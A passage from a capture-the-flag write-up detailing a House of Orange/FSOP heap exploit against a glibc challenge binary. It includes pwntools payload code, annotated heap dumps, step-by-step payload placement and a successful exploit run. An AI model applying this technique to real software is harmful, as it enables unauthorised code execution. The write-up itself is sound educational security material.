<span class="go">0x5bca8ba66100  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="gt">0x0000000000000000</span>      <span class="cp">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66130  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="cp">0x0000000000000000</span>      <span class="nd">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66190  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661a0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661b0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661c0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661d0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661e0  <span class="nd">0x0000000000000000</span>      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba661f0  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66200  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66210  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66220  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66230  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66240  <span class="s1">0x0000000000000000</span>      0x0000000000020dc1      ........0.......         <-- Top chunk</span>
</code></pre></div>

We now need to free a chunk into the unsorted bin and craft a fake file
structure that aligns with the House of Orange exploit. To this end we use the
same trick as before. We overwrite the byte at address `0x5bca8ba66068` to
`0xc1` before freeing the associated chunk and allocating again. As before,
glibc will remainder the chunk, leaving us with a heap that looks like this:

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x0000000000000061</span>      AAAAAAAa........</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0000000000000000</span>      <span class="gt">0x0000000000000061</span>      ........a.......         <-- unsortedbin[all][0]</span>
<span class="go">0x5bca8ba660d0  <span class="gt">0x00007d4636d99b78</span>      <span class="gt">0x00007d4636d99b78</span>      x..6F}..x..6F}..</span>
<span class="go">0x5bca8ba660e0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66100  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="cp">0x0000000000000060</span>      <span class="cp">0x0000000000000060</span>      `.......`.......</span>
<span class="go">0x5bca8ba66130  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="cp">0x0000000000000000</span>      <span class="nd">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66190  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661a0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661b0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661c0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661d0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661e0  <span class="nd">0x0000000000000000</span>      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba661f0  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66200  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66210  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66220  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66230  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66240  <span class="s1">0x0000000000000000</span>      0x0000000000020dc1      ........0.......         <-- Top chunk</span>
</code></pre></div>

We now have two pointers at `0x5bca8ba660d0` and `0x5bca8ba660d8` that we can
use to trick `malloc` into overwriting `_IO_list_all` with a pointer to a fake
file structure.

`_IO_list_all` is defined in glibc as a pointer to an
[`_IO_FILE_plus`](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libioP.h;h=8706af2d901a51a272175f20e9f2d1888094bb7a;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l342)
struct. This data structure wraps the
[`_IO_FILE`](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=efd09f120b49a7cdeef11baba8bce8d4e94215db;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l241)
data structure, as well a pointer to an
[`_IO_jump_t`](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libioP.h;h=8706af2d901a51a272175f20e9f2d1888094bb7a;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l307)
data structure defining the file's
[vtable](https://en.wikipedia.org/wiki/Virtual_method_table).

There's a lot going on in these data structures, and honestly if I'd had to
author a fake file structure from scratch I'd probably still be working on it
as you read this. Fortunately, we can use
[pwntools](https://pypi.org/project/pwntools/) to take a lot of the tedium out
of generating the file structure's bytes by using a `FileStructure` object.
This type offers an `orange` method that generates the House of Orange payload
for us. Here's a little script I cobbled together that gives us a flavour of
what the payload should look like in `pwndbg`:

```python
# orange.py

import itertools
from string import printable

from pwn import FileStructure, context, u64

VALID_CHARS = list(map(ord, set(printable) - set("\t\r\n\x0c\x0b")))


context.arch = 'amd64'
# In our real exploit, `null` should point to a memory location that is
# writeable.
f = FileStructure(null=0xdeadbeef)
# Use 0xc0ded00d as a placeholder for _IO_list_all, and 0x1337c0de as a
# placeholder for the location of the file's vtable.
bs = f.orange(io_list_all=0xc0ded00d, vtable=0x1337c0de)

# Loop through payload in eight byte words, pairwise
qword_bytes = itertools.batched(bs, 8)

for pair in itertools.batched(qword_bytes, n=2):
    pair_bytes = tuple(map(bytes, pair))

    # Format eight byte words as hex integers.
    pieces = [f"0x{u64(bs, 'little'):016x}" for bs in pair_bytes]
    # Generate ascii representation of integers.
    ascii = ''.join([
        chr(b) if b in VALID_CHARS else '.' for b in b''.join(pair_bytes)
    ])
    pieces.append(ascii)
    print(' '.join(pieces))
```

Running this produces the following output:

```shell-session
$ python orange.py 
0x0068732f6e69622f 0x0000000000000061 /bin/sh.a.......
0x0000000000000000 0x00000000c0decffd ................
0x0000000000000000 0x0000000000000001 ................
0x0000000000000000 0x0000000000000000 ................
0x0000000000000000 0x0000000000000000 ................
0x0000000000000000 0x0000000000000000 ................
0x0000000000000000 0x0000000000000000 ................
0x0000000000000000 0xffffffffffffffff ................
0x0000000000000000 0x00000000deadbeef ................
0xffffffffffffffff 0x0000000000000000 ................
0x00000000deadbeef 0x0000000000000000 ................
0x0000000000000000 0x0000000000000000 ................
0x0000000000000000 0x0000000000000000 ................
0x0000000000000000 0x000000001337c0de ..........7.....
```

Great, so now we know what the heap would need to look like, given three
pointers:

- a pointer to a writeable memory location containing a null byte,
- the pointer location of `_IO_list_all`,
- a pointer to a fake `_IO_FILE` vtable, i.e. a pointer to a fake `_IO_jump_t`.

There's a few points to cover before building out the `_IO_FILE` payload though.
First, the `0xc0ded00d` value used in our Python code above doesn't show up in
the output. Instead, the output contains `0xc0dedffd`, or `_IO_list_all - 0x10`.
This means we'll need to perform this subtraction when constructing the payload.
Second, this payload is clearly larger than the chunks we are able to allocate
and write to, so we will have to break this into pieces and write each part to
the heap separately. Finally, we need to understand what the vtable should look
like so that we can build it into the payload.

To address this last point, we can consult the
[definition](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libioP.h;h=8706af2d901a51a272175f20e9f2d1888094bb7a;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l307)
of `_IO_jump_t`. There's a bit of C macro magic going on here, but essentially
we need construct an array containing a pointer to the code we want to execute,
`system`, corresponding to the location of `__overflow` in the vtable. From the
source code for `_IO_jump_t`, this pointer need to be offset by 24 bytes from
the start of the vtable, placing it after `__dummy`, `__dummy2` and `__finish`.

Returning to our heap, we can start to think about where we need to place our
fake `_IO_FILE` and the fake vtable. Since we plan to use `malloc`'s unlinking
behaviour to overwrite the location of `_IO_list_all`, this suggests that our
fake `_IO_FILE` payload should be aligned so that `_IO_list_all - 0x10`
overwrites the `bk` pointer of the chunk in the unsorted bin. In the `pwndbg`
output above, this value needs to be located at address `0x5bca8ba660d8`.
Overlaying the House of Orange payload above onto the `pwndbg` output gives

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x0000000000000061</span>      AAAAAAAa........</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0068732f6e69622f</span>      <span class="gt">0x0000000000000061</span>      /bin/sh.a.......         <-- unsortedbin[all][0]</span>
<span class="go">0x5bca8ba660d0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x000079e030d9a510</span>      ...........0.y..</span>
<span class="go">0x5bca8ba660e0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000001</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66100  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="cp">0x0000000000000060</span>      <span class="cp">0x0000000000000060</span>      `.......`.......</span>
<span class="go">0x5bca8ba66130  <span class="cp">0x0000000000000000</span>      <span class="cp">0xffffffffffffffff</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="cp">0x0000000000000000</span>      <span class="cp">0x00000000deadbeef</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="cp">0xffffffffffffffff</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="cp">0x00000000deadbeef</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="cp">0x0000000000000000</span>      <span class="nd">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66190  <span class="nd">0x0000000000000000</span>      <span class="nd">0x000000001337c0de</span>      ................</span>
<span class="go">0x5bca8ba661a0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661b0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661c0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661d0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661e0  <span class="nd">0x0000000000000000</span>      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba661f0  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66200  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66210  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66220  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66230  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66240  <span class="s1">0x0000000000000000</span>      0x0000000000020dc1      ........0.......         <-- Top chunk</span>
</code></pre></div>

Here I've replaced `0xc0decffd` with the value of `_IO_list_all - 0x10`, which
in this case is `0x000079e030d9a510`, derived using glibc base and offset of
`_IO_list_all` within the glibc binary we've been provided.

Now we need to construct a fake file vtable. This is fairly straightforward. We
can take the address of `system`, which we again know due to our glibc leak, and
write it into the first chunk, ofsetting it by 24 bytes to align with the
expectations of the `_IO_jump_t` structure. We can then update our fake
`_IO_FILE` to reference this vtable, replacing `0x1337c0de` with the address of
the first chunk, `0x5bca8ba66010`.

We're still not quite ready to trigger the exploit, though. In order to invoke
`malloc_printerr`, we need to corrupt heap metadata. To do this we will
overwrite the size byte at `0x5bca8ba660c0` with one that will fail the check
performed by `malloc`
[here](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l3521):

```c
          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
```

This causes `malloc` to loop once more through the loop beginning
[here](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l3470):

```c
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
```

It then performs the check
[here](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l3473):

```c
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
```

This check fails, because the next `victim` in the list of unsorted chunks is
actually located close to `_IO_list_all`. `malloc` interprets the size of this
chunk as zero based on the data located in memory at the time. As a result, the
check fails and `malloc_printerr` is called, triggering the exploit.

Putting all this together, our heap should look like this before our final call
to `malloc`[ref]If you run `vis` in GDB with this payload in place, pwndbg won't
actually be able to render the heap correctly, because we've corrupted the
heap's metadata. Instead, pwndbg will render as much of the heap as it can,
followed by ``Not all chunks were shown, see `vis --help` for more
information.``[/ref]:

<div class="highlight"><pre><span></span><code><span class="gp">pwndbg&gt;</span> vis

<span class="go">0x5bca8ba66000  0x0000000000000000      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66010  <span class="s1">0x6161616261616161</span>      <span class="s1">0x6161616461616163</span>      aaaabaaacaaadaaa</span>
<span class="go">0x5bca8ba66020  <span class="s1">0x6161616661616165</span>      <span class="s1">0x000079e030a3f830</span>      eaaafaaa0..0.y..</span>
<span class="go">0x5bca8ba66030  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66040  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66050  <span class="s1">0x4141414141414141</span>      <span class="s1">0x4141414141414141</span>      AAAAAAAAAAAAAAAA</span>
<span class="go">0x5bca8ba66060  <span class="s1">0x4141414141414141</span>      <span class="sx">0x0000000000000061</span>      AAAAAAAa........</span>
<span class="go">0x5bca8ba66070  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66080  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66090  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660a0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660b0  <span class="sx">0x0000000000000000</span>      <span class="sx">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba660c0  <span class="sx">0x0068732f6e69622f</span>      <span class="gt">0x0000000000000069</span>      /bin/sh.i.......         <-- unsortedbin[all][0]</span>
<span class="go">0x5bca8ba660d0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x000079e030d9a510</span>      ...........0.y..</span>
<span class="go">0x5bca8ba660e0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000001</span>      ................</span>
<span class="go">0x5bca8ba660f0  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66100  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66110  <span class="gt">0x0000000000000000</span>      <span class="gt">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66120  <span class="cp">0x0000000000000060</span>      <span class="cp">0x0000000000000060</span>      `.......`.......</span>
<span class="go">0x5bca8ba66130  <span class="cp">0x0000000000000000</span>      <span class="cp">0xffffffffffffffff</span>      ................</span>
<span class="go">0x5bca8ba66140  <span class="cp">0x0000000000000000</span>      <span class="cp">0x00000000deadbeef</span>      ................</span>
<span class="go">0x5bca8ba66150  <span class="cp">0xffffffffffffffff</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66160  <span class="cp">0x00000000deadbeef</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66170  <span class="cp">0x0000000000000000</span>      <span class="cp">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66180  <span class="cp">0x0000000000000000</span>      <span class="nd">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba66190  <span class="nd">0x0000000000000000</span>      <span class="nd">0x00005bca8ba66010</span>      ................</span>
<span class="go">0x5bca8ba661a0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661b0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661c0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661d0  <span class="nd">0x0000000000000000</span>      <span class="nd">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba661e0  <span class="nd">0x0000000000000000</span>      <span class="s1">0x0000000000000061</span>      ........a.......</span>
<span class="go">0x5bca8ba661f0  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66200  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66210  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66220  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66230  <span class="s1">0x0000000000000000</span>      <span class="s1">0x0000000000000000</span>      ................</span>
<span class="go">0x5bca8ba66240  <span class="s1">0x0000000000000000</span>      0x0000000000020dc1      ........0.......         <-- Top chunk</span>
</code></pre></div>

Now that we know what our payload needs to look like, it's a relatively
straightforward process of carving it up according to the boundaries of the
chunks we've created and writing the payload to the heap, one chunk at a time.

The exact order the chunks are written doesn't matter, but in my exploit I do
the following:

1. Edit the chunk starting at address `0x5bca8ba66010` to set the eight bytes
   starting at address `0x5bca8ba66028` to those corresponding to the address of
   `system`. This is also the very first chunk allocated, so it has index 0.
2. Edit the chunk at address `0x5bca8ba66070` to set the bytes starting at
   address `0x5bca8ba660c0` to "/bin/sh", and the byte at address
   `0x5bca8ba660c8` to `0x69`. This is the eleventh chunk allocated, so it has
   index 10.
3. Edit the chunk at address `0x5bca8ba660d0` to set the bytes starting at
   address `0x5bca8ba660d8` to `0x79e030d9a510`, or `_IO_list_all -
   0x10`. This is the third chunk allocated, so it has index 2.
4. Edit the chunk at address `0x5bca8ba66190` to set the eight bytes at address
   `0x5bca8ba66198` to `0x5bca8ba66010`, or the address of the first chunk. This
   is the fifth chunk allocated, so it has index 4.

The payload above also has data in the chunk starting at `0x5bca8ba66130`, but
these values aren't required for the exploit to work successfully, so we can
omit them from our payload.

# Full Exploit

I put together a Python script using pwntools to implement all the steps
described above, viewable
[here](https://gist.github.com/mspraggs/18cd54cca08b710af225b70949aa161f). The
CTF is over, but let's run the exploit locally anyway...

```shell-session
$ python exploit.py -e ./refreshments -l glibc/libc.so.6
None
[*] Attempt 1 of 10
[*] './refreshments'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] './glibc/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
[x] Starting local process './refreshments'
[▁] Starting local process './refreshments'
[+] id 268219
[*] libc base @ 0x72caea600000
[*] heap @ 0x5eb6a91f1000
[+] Flag: HTB{f4k3_fl4g_4_t35t1ng}
[*] Stopped process './refreshments' (pid 268219)
```

Okay, cool. Looks like it works!

This is probably the hardest binary exploitation challenge I've done yet, so
it's not very surprising I got a bit stuck. Still, I learnt some cool tricks
about how glibc heap allocation works internally, and it was interesting to
dive into the details of House of Orange and FSOP. I'll definitely be putting my
name down to enter next year!
